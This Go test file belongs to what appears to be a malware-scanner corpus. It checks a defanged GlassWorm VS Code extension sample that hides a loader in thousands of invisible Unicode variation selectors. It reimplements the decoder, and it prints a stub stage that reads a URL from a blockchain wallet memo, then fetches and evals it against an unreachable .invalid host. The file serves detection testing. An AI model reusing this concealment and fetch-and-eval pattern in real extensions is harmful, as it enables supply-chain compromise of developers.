package livescan

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"io"
	"net"
	"regexp"
	"strings"
	"testing"
	"unicode"
)

// The GlassWorm sample hides its loader in a run of invisible characters:
// Unicode variation selectors, one per byte of the code that eval runs. Those
// are the first thing an editor, a formatter, a clipboard or a careless
// regeneration of the file loses, and a run that was stripped or re-encoded
// would still parse, still build and still pass every generic corpus test; it
// would just no longer be the attack. These tests pin the run. They also read
// the stage it decodes to, which TestCorpusIsDefanged cannot see, against the
// same defanging rules as every other file.

const glassWormID = "glassworm-codejoy-1.8.3"

// glassWormStub is the text the sample's run must decode to, byte for byte: a
// stage that can do nothing, with a memo that is a fixed string, an address
// under .invalid, and a fetch and an eval that can never get an answer.
const glassWormStub = `(async () => {
  const WALLET = 'O0O0O0O0O0O0O0O0O0O0O0O0O0O0O0O0O0O0O0O0O0O0';

  // newest transactions per wallet; a memo reads "[<length>] <text>" and the text is JSON
  const ledger = {
    [WALLET]: [
      { signature: 'a1a1a1a1a1a1a1a1', slot: 1, memo: null },
      { signature: 'b2b2b2b2b2b2b2b2', slot: 2, memo: '[47] {"link":"aHR0cDovL25leHQuaW52YWxpZC9zdGFnZTI="}' },
    ],
  };

  async function getSignaturesForAddress(address, options) {
    return (ledger[address] || []).slice(0, options.limit);
  }

  // the first entry that carries a memo names the next stage
  async function nextStageUrl() {
    const signatures = await getSignaturesForAddress(WALLET, { limit: 1000 });
    const memo = signatures.filter((x) => x && x.memo)[0].memo;
    const c2Data = JSON.parse(memo.replace(/\[\d+\]\s*/, ''));
    return atob(c2Data.link);
  }

  // look again a few times, ten seconds apart
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const res = await fetch(await nextStageUrl());
      eval(await res.text());
      return;
    } catch (err) {
      await new Promise((resolve) => setTimeout(resolve, 10000));
    }
  }
})();
`

// glassWormCall is the call that hands the run to the decoder: the run is the
// template literal that follows it.
const glassWormCall = "eval(Buffer.from(s(`"

// glassWormRune reports whether r is one of the code points the loader decodes:
// the 256 Unicode variation selectors, U+FE00-FE0F and U+E0100-E01EF.
func glassWormRune(r rune) bool {
	return (r >= 0xFE00 && r <= 0xFE0F) || (r >= 0xE0100 && r <= 0xE01EF)
}

// glassWormDecode is the loader's own rule, written out again: a code point in
// U+FE00-FE0F is the byte cp-0xFE00, one in U+E0100-E01EF the byte
// cp-0xE0100+16, and every other code point is dropped.
func glassWormDecode(s string) []byte {
	var out []byte
	for _, r := range s {
		switch {
		case r >= 0xFE00 && r <= 0xFE0F:
			out = append(out, byte(r-0xFE00))
		case r >= 0xE0100 && r <= 0xE01EF:
			out = append(out, byte(r-0xE0100+16))
		}
	}
	return out
}

// glassWormCount is the number of variation selectors in b.
func glassWormCount(b []byte) int {
	n := 0
	for _, r := range string(b) {
		if glassWormRune(r) {
			n++
		}
	}
	return n
}

func loadGlassWorm(t *testing.T) *Sample {
	t.Helper()
	data, err := corpusFS.ReadFile("testdata/corpus/" + glassWormID + ".txtar")
	if err != nil {
		t.Fatalf("reading the sample: %v", err)
	}
	s, err := ParseSample(data)
	if err != nil {
		t.Fatalf("parsing the sample: %v", err)
	}
	return s
}

// glassWormLiteral returns the template literal the loader passes to its
// decoder, as it stands in the file.
func glassWormLiteral(t *testing.T, js []byte) string {
	t.Helper()
	text := string(js)
	start := strings.Index(text, glassWormCall)
	if start < 0 {
		t.Fatalf("extension.js does not hold the call %q", glassWormCall)
	}
	start += len(glassWormCall)
	end := strings.Index(text[start:], "`")
	if end < 0 {
		t.Fatal("extension.js: the template literal after the decoder call is not closed")
	}
	return text[start : start+end]
}

// glassWormRun returns the text the malicious extension.js decodes to.
func glassWormRun(t *testing.T, s *Sample) string {
	t.Helper()
	js, ok := s.Files(Malicious)["extension.js"]
	if !ok {
		t.Fatal("the malicious variant has no extension.js")
	}
	return string(glassWormDecode(glassWormLiteral(t, js)))
}

func TestGlassWormRunIsIntact(t *testing.T) {
	s := loadGlassWorm(t)
	js := s.Files(Malicious)["extension.js"]
	if js == nil {
		t.Fatal("the malicious variant has no extension.js")
	}

	// A long run of them: the mechanism is the sheer length of what cannot be
	// seen, and a run that shrank to a few characters is a different sample.
	total := glassWormCount(js)
	if total < 1000 {
		t.Errorf("extension.js holds %d variation selectors, want at least 1000", total)
	}

	// All of them in one template literal, and nothing but them in it: any other
	// character (a replacement character, a space, a newline) means the run was
	// mangled on its way through an editor or a tool.
	literal := glassWormLiteral(t, js)
	runes := []rune(literal)
	for i, r := range runes {
		if !glassWormRune(r) {
			t.Fatalf("the template literal holds %U at position %d: only variation selectors may stand in the run", r, i)
		}
	}
	if len(runes) != total {
		t.Errorf("extension.js holds %d variation selectors, but the template literal only %d: the rest sit where a reader would not expect them", total, len(runes))
	}

	// The decoder in the file is the rule glassWormDecode re-implements.
	for _, want := range []string{
		"w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 :",
		"w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null",
		".filter(n => n !== null)",
	} {
		if !bytes.Contains(js, []byte(want)) {
			t.Errorf("extension.js does not hold the decoder line %q", want)
		}
	}

	// And the run decodes to the stage, byte for byte.
	got := string(glassWormDecode(literal))
	if got != glassWormStub {
		i := 0
		for i < len(got) && i < len(glassWormStub) && got[i] == glassWormStub[i] {
			i++
		}
		t.Errorf("the run decodes to %d bytes, want %d; they first differ at byte %d", len(got), len(glassWormStub), i)
	}
}

// The control carries none of it, and neither does any other file of the
// malicious variant: the invisible characters are the attack, and everything
// else in the extension is what a reviewer sees.
func TestGlassWormInvisibleCharactersStayInTheLoader(t *testing.T) {
	s := loadGlassWorm(t)
	for p, b := range s.Files(Benign) {
		for _, r := range string(b) {
			if glassWormRune(r) || unicode.Is(unicode.Cf, r) {
				t.Errorf("the benign variant's %s holds the invisible character %U", p, r)
				break
			}
		}
	}
	for p, b := range s.Files(Malicious) {
		if p == "extension.js" {
			continue
		}
		if n := glassWormCount(b); n != 0 {
			t.Errorf("the malicious variant's %s holds %d variation selectors; only extension.js may", p, n)
		}
	}
}

// glassWormBase58 is a run of characters a Solana address is made of, long enough to
// be one.
var glassWormBase58 = regexp.MustCompile(`[1-9A-HJ-NP-Za-km-z]{32,44}`)

// The generic corpus checks read the files as text, and the stage is hidden in
// an invisible run, so they never see it. Decoded, it must pass the same rules:
// every URL host reserved, every address in a documentation range, and no
// string that could be a wallet.
func TestGlassWormStageIsInert(t *testing.T) {
	s := loadGlassWorm(t)
	stage := glassWormRun(t, s)

	var nets []*net.IPNet
	for _, c := range testNets {
		_, n, _ := net.ParseCIDR(c)
		nets = append(nets, n)
	}
	for _, text := range withDecodedBase64(stage, 3) {
		checkText(t, s, "malicious", "extension.js (decoded run)", text, nets)
	}

	if m := glassWormBase58.FindString(stage); m != "" {
		t.Errorf("the stage holds %q, which could be a wallet address; use a string that is not valid base58", m)
	}
	for _, want := range []string{"getSignaturesForAddress(", "atob(", "fetch(", "eval("} {
		if !strings.Contains(stage, want) {
			t.Errorf("the stage no longer shows %q", want)
		}
	}
}

// The extension is served as a .vsix: the run must come out of it unchanged, in
// the place the VSIX builder puts it, next to a manifest that names it.
func TestGlassWormArtifactCarriesTheRun(t *testing.T) {
	s := loadGlassWorm(t)
	for _, v := range []Variant{Benign, Malicious} {
		body := VSIX(s.Extension.Publisher, s.Extension.Name, s.VersionOf(v), s.Files(v))
		zr, err := zip.NewReader(bytes.NewReader(body), int64(len(body)))
		if err != nil {
			t.Fatalf("%s: the .vsix is not a zip: %v", v, err)
		}
		files := map[string][]byte{}
		for _, f := range zr.File {
			rc, err := f.Open()
			if err != nil {
				t.Fatalf("%s: opening %s: %v", v, f.Name, err)
			}
			b, err := io.ReadAll(rc)
			rc.Close()
			if err != nil {
				t.Fatalf("%s: reading %s: %v", v, f.Name, err)
			}
			files[f.Name] = b
		}

		js, ok := files["extension/extension.js"]
		if !ok {
			t.Fatalf("%s: the .vsix has no extension/extension.js", v)
		}
		n := glassWormCount(js)
		switch v {
		case Malicious:
			if n < 1000 {
				t.Errorf("%s: extension/extension.js holds %d variation selectors, want at least 1000", v, n)
			}
			if got := string(glassWormDecode(glassWormLiteral(t, js))); got != glassWormStub {
				t.Errorf("%s: the run in the .vsix no longer decodes to the stage", v)
			}
		default:
			if n != 0 {
				t.Errorf("%s: extension/extension.js holds %d variation selectors, want none", v, n)
			}
		}

		var manifest struct {
			Name             string   `json:"name"`
			Version          string   `json:"version"`
			Publisher        string   `json:"publisher"`
			Main             string   `json:"main"`
			ActivationEvents []string `json:"activationEvents"`
			Engines          struct {
				VSCode string `json:"vscode"`
			} `json:"engines"`
		}
		if err := json.Unmarshal(files["extension/package.json"], &manifest); err != nil {
			t.Fatalf("%s: extension/package.json: %v", v, err)
		}
		if manifest.Publisher != s.Extension.Publisher || manifest.Name != s.Extension.Name {
			t.Errorf("%s: the manifest names %s.%s, the sample %s.%s", v, manifest.Publisher, manifest.Name, s.Extension.Publisher, s.Extension.Name)
		}
		if manifest.Version != s.VersionOf(v) {
			t.Errorf("%s: the manifest says version %s, the variant is %s", v, manifest.Version, s.VersionOf(v))
		}
		if manifest.Engines.VSCode == "" || len(manifest.ActivationEvents) == 0 {
			t.Errorf("%s: the manifest lacks engines.vscode or activationEvents", v)
		}
		if _, ok := files["extension/"+strings.TrimPrefix(manifest.Main, "./")]; !ok || manifest.Main == "" {
			t.Errorf("%s: the manifest's main %q is not in the .vsix", v, manifest.Main)
		}
	}
}
